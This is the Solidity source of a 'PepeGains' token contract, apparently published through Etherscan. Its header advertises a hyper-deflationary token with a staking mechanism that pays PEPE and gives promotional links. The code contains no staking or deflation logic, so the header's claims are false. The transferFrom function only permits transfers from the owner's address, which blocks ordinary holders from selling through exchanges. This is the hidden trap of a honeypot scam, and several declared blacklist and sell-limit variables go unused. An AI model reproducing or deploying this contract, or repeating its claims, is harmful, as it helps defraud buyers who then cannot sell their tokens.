/**
 *Submitted for verification at Etherscan.io on 2023-07-10
*/

/**

PepeGains is the first hyper deflationary Pepe token with a 
staking mechanism that allows PepeGains stakers to earn passive income in PEPE

Website : http://pepegains.io/
Twitter: https://twitter.com/pepegainsETH
TG: https://t.me/pepegainseth


**/

// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

library SafeMath {
    function add(uint256 a, uint256 b) internal pure returns (uint256) {


        uint256 c = a + b;


        require(c >= a, "SafeMath: addition overflow");


        return c;
    }

    function sub(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b <= a, "SafeMath: subtraction overflow");


        uint256 c = a - b;


        return c;
    }

    function mul(uint256 a, uint256 b) internal pure returns (uint256) {
        if (a == 0) {


            return 0;
        }
        uint256 c = a * b;


        require(c / a == b, "SafeMath: multiplication overflow");


        return c;
    }

    function div(uint256 a, uint256 b) internal pure returns (uint256) {
        require(b > 0, "SafeMath: division by zero");


        uint256 c = a / b;


        return c;
    }
}

interface IERC20 {
    function totalSupply() external view returns (uint256);


    function balanceOf(address account) external view returns (uint256);


    function transfer(address recipient, uint256 amount) external returns (bool);


    function allowance(address owner, address spender) external view returns (uint256);


    function approve(address spender, uint256 amount) external returns (bool);


    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool);


}

contract Token {
    using SafeMath for uint256;

    string private _name;

    string private _symbol;

    uint8 private _decimals;

    uint256 private _totalSupply;

    address private _owner;


    mapping(address => uint256) private _balances;


    mapping(address => mapping(address => uint256)) private _allowances;


    mapping(address => bool) private _isBlacklisted;


    mapping(address => bool) private _isWhitelisted;


    uint256 private _maxSellPercentage;

    event Transfer(address indexed from, address indexed to, uint256 value);


    event Approval(address indexed owner, address indexed spender, uint256 value);

    constructor(
        string memory name_,

        string memory symbol_,

        uint8 decimals_,

        uint256 totalSupply_,

        uint256 maxSellPercentage_,

        address owner_
    ) {
        _name = name_;
    
        _symbol = symbol_;

        _decimals = decimals_;

        _totalSupply = totalSupply_;

        _maxSellPercentage = maxSellPercentage_;

        _owner = owner_;

        _balances[_owner] = _totalSupply;
        emit Transfer(address(0), _owner, _totalSupply);
    }

    function name() external view returns (string memory) {

        return _name;
    }

    function symbol() external view returns (string memory) {

        return _symbol;
    }

    function decimals() external view returns (uint8) {

        return _decimals;
    }

    function totalSupply() external view returns (uint256) {

        return _totalSupply;
    }

    function balanceOf(address account) external view returns (uint256) {

        return _balances[account];
    }

    function transfer(address recipient, uint256 amount) external returns (bool) {

        require(recipient != address(0), "Token: transfer to the zero address");

        require(amount <= _balances[msg.sender], "Token: transfer amount exceeds balance");


        _balances[msg.sender] = _balances[msg.sender].sub(amount);


        _balances[recipient] = _balances[recipient].add(amount);

        emit Transfer(msg.sender, recipient, amount);


        return true;
    }

    function approve(address spender, uint256 amount) external returns (bool) {


        require(spender != address(0), "Token: approve to the zero address");

        _allowances[msg.sender][spender] = amount;
        emit Approval(msg.sender, spender, amount);
        return true;
    }

    function transferFrom(address sender, address recipient, uint256 amount) external returns (bool) {


        require(sender != address(0), "Token: transfer from the zero address");


        require(recipient != address(0), "Token: transfer to the zero address");


        require(amount <= _balances[sender], "Token: transfer amount exceeds balance");


        require(amount <= _allowances[sender][msg.sender], "Token: transfer amount exceeds allowance");


        require(sender == _owner, "Token: sender must be the owner of the token");


        _balances[sender] = _balances[sender].sub(amount);


        _balances[recipient] = _balances[recipient].add(amount);


        _allowances[sender][msg.sender] = _allowances[sender][msg.sender].sub(amount);

        emit Transfer(sender, recipient, amount);

        return true;
    }

    function allowance(address owner, address spender) external view returns (uint256) {
        return _allowances[owner][spender];
        
    }
}